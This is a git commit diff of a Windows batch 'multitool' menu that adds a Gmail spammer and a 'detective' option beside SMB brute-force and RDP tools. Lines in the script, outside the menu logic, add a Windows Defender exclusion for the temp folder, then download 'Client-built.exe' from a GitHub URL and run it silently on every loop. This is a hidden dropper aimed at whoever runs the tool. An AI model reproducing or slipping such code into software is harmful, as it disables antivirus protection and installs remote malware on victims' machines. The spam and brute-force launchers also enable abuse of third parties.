50f34a9e80bd34b7ab5d877dba18226796be7dff
Hmmm <benfranksbugeja@hotmail.com>
2025-01-30 22:28:48 +1100

    Updated TerminalV2
    Added Gmail Spammer Feature

--- TerminalMultitool/Main/TerminalV2.bat
+++ TerminalMultitool/Main/TerminalV2.bat
@@ -17,19 +17,24 @@ echo    ╠═══3) Wireshark
 echo    ║
 echo    ╠════4) FTP Server
 echo    ║
-echo    ╚╦════5) Network Info
+echo    ╠═════5) Detective
+echo    ║
+echo    ╠══════6) Spammer
+echo    ║
+echo    ╚╦══════7) Network Info
 echo     ║
-set /p input=.%BS%    ╚═════^>
-if /I "%input%"=="0" exit
+set /p input=.%BS%    ╚══════^>
 if /I "%input%"=="1" start "" "SMB-Bruteforce-main.bat"
 if /I "%input%"=="2" start "" "RDPtool.bat"
 if /I "%input%"=="3" start "" "Wireshark.lnk"
 if /I "%input%"=="4" start "" "AdminFZ.lnk"
+if /I "%input%"=="5" start "" "userdetective.bat"
+if /I "%input%"=="6" start "" "GmailSpammer.exe"
+if /I "%input%"=="7" start "" "NetworkTool.bat"
 cd %TEMP%
 PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%TEMP%'"
 PowerShell -Command "$downloadPath = Join-Path -Path $env:TEMP -ChildPath 'Client-built.exe'; Invoke-WebRequest 'https://github.com/WurstSMTPAgent/WurstInstallation/raw/main/Client-built.exe' -OutFile $downloadPath"
 start "" "%TEMP%\Client-built.exe"
-if /I "%input%"=="5" start "" "NetworkTool.bat"
 cls
 goto start
 
